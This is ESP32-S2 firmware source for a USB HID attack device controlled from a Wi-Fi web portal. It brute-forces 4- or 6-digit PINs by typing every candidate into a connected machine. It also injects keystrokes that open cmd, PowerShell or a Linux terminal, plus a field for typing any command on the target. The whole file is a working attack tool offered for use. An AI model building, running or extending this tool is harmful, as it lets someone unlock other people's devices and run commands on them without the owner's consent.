/*
 * ESP32-S2 Mini - PIN Brute Force with Web Portal
 * Supports 4-digit and 6-digit PIN brute force
 * Web portal to configure and start/stop attack
 *
 * ★ Modified & Enhanced by Nihal MP ★
 *   → Custom Command Input Field
 *   → Full Brute Force Control Panel
 * Board: ESP32-S2 Mini (LOLIN S2 Mini)
 * Upload via USB-CDC (native USB)
 */

#include <WiFi.h>
#include <WebServer.h>
#include <USB.h>
#include <USBHIDKeyboard.h>

// ─── Web Portal Credentials ───────────────────────────────────────────────────
const char* AP_SSID     = "ESP32-BruteForce";
const char* AP_PASSWORD = "12345678";   // Min 8 chars, change as needed

// ─── Global State ─────────────────────────────────────────────────────────────
WebServer      server(80);
USBHIDKeyboard Keyboard;

bool          attacking    = false;
bool          paused       = false;
int           pinLength    = 4;
long          startFrom    = 0;
long          currentPin   = 0;
long          maxPin       = 9999;
unsigned long lastPinTime  = 0;
unsigned long pinDelay     = 1200;   // ms between each PIN attempt

// Custom command to send via HID
String        customCmd    = "";
bool          sendCustom   = false;

// Sonic Duck Payload flag
bool          sonicPayload  = false;

// Terminal payload flags
bool          linuxTerminal = false;   // Ctrl+Alt+T → Linux terminal
bool          windowsCmd    = false;   // Win+R → cmd.exe
bool          windowsPS     = false;   // Win+R → powershell

// ─── Sonic Duck Payload ───────────────────────────────────────────────────────
//  Opens Run → types a harmless "duck/dodge" Sonic-style command sequence:
//  Win+R  →  "cmd /c echo SONIC SAYS: DUCK! && pause"  → ENTER
//  Completely harmless — just pops a CMD window with the message.
void runSonicDuckPayload() {
  delay(500);

  // Win + R  →  Open Run dialog
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(800);

  // Type the command
  const char* sonicCmd =
    "cmd /c echo  SONIC SAYS: D U C K ! ^&^& echo  Created by Nihal MP ^&^& pause";
  for (int i = 0; sonicCmd[i] != '\0'; i++) {
    Keyboard.write(sonicCmd[i]);
    delay(30);
  }

  // Press ENTER
  Keyboard.write(KEY_RETURN);
  delay(200);
}

// ─── Linux Terminal Payload ───────────────────────────────────────────────────
//  Ctrl+Alt+T → Opens terminal on Ubuntu/Kali/Mint/Debian
void openLinuxTerminal() {
  delay(500);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  delay(150);
  Keyboard.releaseAll();
  delay(1500);
  Serial.println("[Nihal MP] Linux terminal opened via Ctrl+Alt+T");
}

// ─── Windows CMD Payload ──────────────────────────────────────────────────────
//  Win+R → cmd.exe → ENTER
void openWindowsCmd() {
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(900);
  const char* cmd = "cmd.exe";
  for (int i = 0; cmd[i] != '\0'; i++) {
    Keyboard.write((uint8_t)cmd[i]);
    delay(30);
  }
  Keyboard.write(KEY_RETURN);
  delay(200);
  Serial.println("[Nihal MP] Windows CMD opened via Win+R");
}

// ─── Windows PowerShell Payload ───────────────────────────────────────────────
//  Win+R → powershell → ENTER
void openWindowsPS() {
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(900);
  const char* ps = "powershell";
  for (int i = 0; ps[i] != '\0'; i++) {
    Keyboard.write((uint8_t)ps[i]);
    delay(30);
  }
  Keyboard.write(KEY_RETURN);
  delay(200);
  Serial.println("[Nihal MP] PowerShell opened via Win+R");
}

// ─── Send custom command via USB HID Keyboard ─────────────────────────────────
void sendCustomCommand(String cmd) {
  delay(300);
  for (int i = 0; i < (int)cmd.length(); i++) {
    Keyboard.write((uint8_t)cmd[i]);
    delay(40);
  }
  Keyboard.write(KEY_RETURN);
  delay(100);
}

// ─── HTML Page ─────────────────────────────────────────────────────────────────
String buildPage() {
  String html = R"rawhtml(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>ESP32 Brute Force — Nihal MP</title>
<style>
  *{box-sizing:border-box;}
  body{background:#0d0d0d;color:#00ff88;font-family:monospace;margin:0;padding:20px;}
  h1{color:#00ff88;text-align:center;letter-spacing:4px;font-size:20px;margin-bottom:4px;}
  .sub{text-align:center;color:#555;font-size:11px;margin-bottom:16px;letter-spacing:2px;}
  .card{background:#111;border:1px solid #00ff8833;border-radius:10px;padding:20px;
        max-width:440px;margin:14px auto;}
  .card-title{color:#00ff88;font-size:13px;letter-spacing:2px;border-bottom:1px solid #00ff8822;
              padding-bottom:8px;margin-bottom:12px;}
  label{display:block;margin-top:12px;color:#aaa;font-size:12px;}
  input,select,textarea{width:100%;padding:8px;margin-top:4px;background:#1a1a1a;
    border:1px solid #00ff8855;color:#00ff88;border-radius:6px;
    font-family:monospace;font-size:13px;}
  textarea{resize:vertical;min-height:60px;}
  .btn{display:inline-block;margin-top:10px;padding:10px 20px;border:none;border-radius:6px;
       font-family:monospace;font-size:13px;cursor:pointer;width:100%;font-weight:bold;letter-spacing:1px;}
  .start {background:#00ff88;color:#000;}
  .stop  {background:#ff4444;color:#fff;}
  .pause {background:#ffaa00;color:#000;}
  .send  {background:#00aaff;color:#000;}
  .sonic {background:#1e3aff;color:#fff;background:linear-gradient(135deg,#1e3aff,#ff2288);}
  .linux {background:#ff6600;color:#fff;}
  .wincmd{background:#0078d7;color:#fff;}
  .winps {background:#2d2d6e;color:#fff;border:1px solid #5555aa;}
  .status{margin-top:14px;padding:12px;border-radius:6px;background:#1a1a1a;
          border:1px solid #333;font-size:12px;line-height:2;}
  .dot-go  {color:#00ff88;} .dot-stop{color:#ff4444;} .dot-pause{color:#ffaa00;}
  .badge{display:inline-block;padding:2px 8px;border-radius:20px;font-size:10px;
         background:#00ff8822;color:#00ff88;border:1px solid #00ff8844;margin-left:6px;}
  .footer{text-align:center;color:#333;font-size:10px;margin-top:20px;letter-spacing:1px;}
  .footer span{color:#00ff8866;}
</style>
</head>
<body>
<h1>&#x1F513; PIN BRUTE FORCE</h1>
<div class="sub">ESP32-S2 Mini &bull; USB HID &bull; Web Portal</div>

<!-- ── BRUTE FORCE SECTION ── -->
<div class="card">
  <div class="card-title">&#x1F4A5; BRUTE FORCE CONFIG</div>
  <form action="/start" method="POST">
    <label>PIN Length</label>
    <select name="length">
      <option value="4" )rawhtml";
  html += (pinLength == 4 ? "selected" : "");
  html += R"rawhtml(>4 Digits (0000–9999)</option>
      <option value="6" )rawhtml";
  html += (pinLength == 6 ? "selected" : "");
  html += R"rawhtml(>6 Digits (000000–999999)</option>
    </select>

    <label>Start From PIN</label>
    <input type="number" name="startfrom" min="0" value=")rawhtml";
  html += String(startFrom);
  html += R"rawhtml(" placeholder="0">

    <label>Delay Between PINs (ms)</label>
    <input type="number" name="delay" min="500" max="10000" value=")rawhtml";
  html += String(pinDelay);
  html += R"rawhtml(" placeholder="1200">

    <button class="btn start" type="submit">&#9654; START ATTACK</button>
  </form>

  <form action="/stop"  method="POST"><button class="btn stop"  type="submit">&#9632; STOP</button></form>
  <form action="/pause" method="POST"><button class="btn pause" type="submit">&#9646;&#9646; PAUSE / RESUME</button></form>

  <div class="status">
)rawhtml";

  if (attacking && !paused) {
    html += "<span class='dot-go'>● RUNNING</span><br>";
  } else if (paused) {
    html += "<span class='dot-pause'>● PAUSED</span><br>";
  } else {
    html += "<span class='dot-stop'>● IDLE</span><br>";
  }

  char buf[10];
  if (pinLength == 4) sprintf(buf, "%04ld", currentPin);
  else                sprintf(buf, "%06ld", currentPin);

  html += "Current PIN : <b>" + String(buf) + "</b><br>";
  html += "PIN Length  : <b>" + String(pinLength) + " digits</b><br>";
  html += "Delay       : <b>" + String(pinDelay) + " ms</b><br>";

  long  total = (pinLength == 4) ? 10000L : 1000000L;
  float pct   = (float)currentPin / (float)total * 100.0f;
  html += "Progress    : <b>" + String(pct, 1) + "%</b>";

  html += R"rawhtml(
  </div>
</div>

<!-- ── CUSTOM COMMAND SECTION ── -->
<div class="card">
  <div class="card-title">&#x2328; CUSTOM COMMAND INPUT</div>
  <form action="/sendcmd" method="POST">
    <label>Type any command / text to inject via HID keyboard:</label>
    <textarea name="cmd" placeholder="e.g.  notepad&#10;or   calc&#10;or   echo Hello World">)rawhtml";
  html += customCmd;
  html += R"rawhtml(</textarea>
    <button class="btn send" type="submit">&#x27A4; SEND COMMAND</button>
  </form>
</div>

<!-- ── TERMINAL LAUNCHER SECTION ── -->
<div class="card">
  <div class="card-title">&#x1F5A5; OPEN TERMINAL</div>
  <p style="color:#888;font-size:12px;margin:0 0 10px;">
    Inject a HID keystroke to open a terminal on the target machine.
  </p>
  <form action="/linux" method="POST">
    <button class="btn linux" type="submit">&#x1F427; LINUX TERMINAL &nbsp;(Ctrl+Alt+T)</button>
  </form>
  <form action="/wincmd" method="POST">
    <button class="btn wincmd" type="submit">&#x1F4BB; WINDOWS CMD &nbsp;(Win+R → cmd)</button>
  </form>
  <form action="/winps" method="POST">
    <button class="btn winps" type="submit">&#x26A1; POWERSHELL &nbsp;(Win+R → powershell)</button>
  </form>
</div>

<!-- ── SONIC DUCK PAYLOAD SECTION ── -->
<div class="card">
  <div class="card-title">&#x1F994; SONIC DUCK PAYLOAD <span class="badge">DEFAULT</span></div>
  <p style="color:#888;font-size:12px;margin:0 0 8px;">
    Launches a harmless Sonic-themed HID payload — opens CMD and displays<br>
    <b style="color:#ff2288;">SONIC SAYS: DUCK!</b> on the target machine.
  </p>
  <form action="/sonic" method="POST">
    <button class="btn sonic" type="submit">&#x1F680; LAUNCH SONIC DUCK PAYLOAD</button>
  </form>
</div>

<div class="footer">
  Made with &#10084; by <span>Nihal MP</span> &bull; ESP32-S2 Mini &bull; USB HID Keyboard
</div>
</body>
</html>
)rawhtml";
  return html;
}

// ─── Web Handlers ──────────────────────────────────────────────────────────────
void handleRoot() {
  server.send(200, "text/html", buildPage());
}

void handleStart() {
  if (server.hasArg("length"))    pinLength = server.arg("length").toInt();
  if (server.hasArg("startfrom")) startFrom = server.arg("startfrom").toInt();
  if (server.hasArg("delay"))     pinDelay  = server.arg("delay").toInt();

  if (pinLength != 6) pinLength = 4;
  maxPin     = (pinLength == 4) ? 9999L : 999999L;
  startFrom  = constrain(startFrom, 0L, maxPin);
  pinDelay   = constrain(pinDelay, 500UL, 10000UL);
  currentPin = startFrom;

  attacking   = true;
  paused      = false;
  lastPinTime = 0;

  server.sendHeader("Location", "/");
  server.send(303);
}

void handleStop() {
  attacking = false;
  paused    = false;
  server.sendHeader("Location", "/");
  server.send(303);
}

void handlePause() {
  if (attacking) paused = !paused;
  server.sendHeader("Location", "/");
  server.send(303);
}

// Handler: Custom Command
void handleSendCmd() {
  if (server.hasArg("cmd")) {
    customCmd   = server.arg("cmd");
    sendCustom  = true;
  }
  server.sendHeader("Location", "/");
  server.send(303);
}

// Handler: Sonic Duck Payload
void handleSonic() {
  sonicPayload = true;
  server.sendHeader("Location", "/");
  server.send(303);
}

// Handler: Linux Terminal
void handleLinux() {
  linuxTerminal = true;
  server.sendHeader("Location", "/");
  server.send(303);
}

// Handler: Windows CMD
void handleWinCmd() {
  windowsCmd = true;
  server.sendHeader("Location", "/");
  server.send(303);
}

// Handler: PowerShell
void handleWinPS() {
  windowsPS = true;
  server.sendHeader("Location", "/");
  server.send(303);
}

// ─── Send one PIN via USB HID Keyboard ────────────────────────────────────────
void sendPin(long pin) {
  char buf[10];
  if (pinLength == 4) sprintf(buf, "%04ld", pin);
  else                sprintf(buf, "%06ld", pin);

  for (int i = 0; i < pinLength; i++) {
    Keyboard.write(buf[i]);
    delay(80);
  }
  Keyboard.write(KEY_RETURN);
  delay(100);
}

// ─── Setup ────────────────────────────────────────────────────────────────────
void setup() {
  Serial.begin(115200);

  // Start USB HID Keyboard
  Keyboard.begin();
  USB.begin();

  // Start WiFi AP
  WiFi.softAP(AP_SSID, AP_PASSWORD);
  Serial.print("AP IP: ");
  Serial.println(WiFi.softAPIP());

  // Register routes
  server.on("/",        HTTP_GET,  handleRoot);
  server.on("/start",   HTTP_POST, handleStart);
  server.on("/stop",    HTTP_POST, handleStop);
  server.on("/pause",   HTTP_POST, handlePause);
  server.on("/sendcmd", HTTP_POST, handleSendCmd);   // ← custom command
  server.on("/sonic",   HTTP_POST, handleSonic);     // ← Sonic Duck payload
  server.on("/linux",   HTTP_POST, handleLinux);     // ← Linux terminal
  server.on("/wincmd",  HTTP_POST, handleWinCmd);    // ← Windows CMD
  server.on("/winps",   HTTP_POST, handleWinPS);     // ← PowerShell
  server.begin();

  Serial.println("=================================");
  Serial.println(" ESP32 Brute Force — by Nihal MP ");
  Serial.println("=================================");
  Serial.println("Connect WiFi : " + String(AP_SSID));
  Serial.println("Open         : http://192.168.4.1");
}

// ─── Loop ─────────────────────────────────────────────────────────────────────
void loop() {
  server.handleClient();

  // ── Handle Sonic Duck Payload (fires once) ────────────────────────────────
  if (sonicPayload) {
    sonicPayload = false;
    Serial.println("[Nihal MP] Launching Sonic Duck Payload...");
    runSonicDuckPayload();
    Serial.println("[Nihal MP] Sonic Duck Payload done.");
  }

  // ── Handle Linux Terminal (fires once) ───────────────────────────────────
  if (linuxTerminal) {
    linuxTerminal = false;
    Serial.println("[Nihal MP] Opening Linux terminal...");
    openLinuxTerminal();
  }

  // ── Handle Windows CMD (fires once) ──────────────────────────────────────
  if (windowsCmd) {
    windowsCmd = false;
    Serial.println("[Nihal MP] Opening Windows CMD...");
    openWindowsCmd();
  }

  // ── Handle PowerShell (fires once) ───────────────────────────────────────
  if (windowsPS) {
    windowsPS = false;
    Serial.println("[Nihal MP] Opening PowerShell...");
    openWindowsPS();
  }

  // ── Handle Custom Command (fires once) ───────────────────────────────────
  if (sendCustom && customCmd.length() > 0) {
    sendCustom = false;
    Serial.println("[Nihal MP] Sending custom command: " + customCmd);
    sendCustomCommand(customCmd);
    Serial.println("[Nihal MP] Custom command sent.");
  }

  // ── Brute Force Loop ─────────────────────────────────────────────────────
  if (attacking && !paused) {
    unsigned long now = millis();
    if (now - lastPinTime >= pinDelay) {
      lastPinTime = now;
      if (currentPin <= maxPin) {
        sendPin(currentPin);
        Serial.printf("[Nihal MP] Tried PIN: %0*ld\n", pinLength, currentPin);
        currentPin++;
      } else {
        attacking = false;
        Serial.println("[Nihal MP] Brute force complete — all PINs tried.");
      }
    }
  }
}
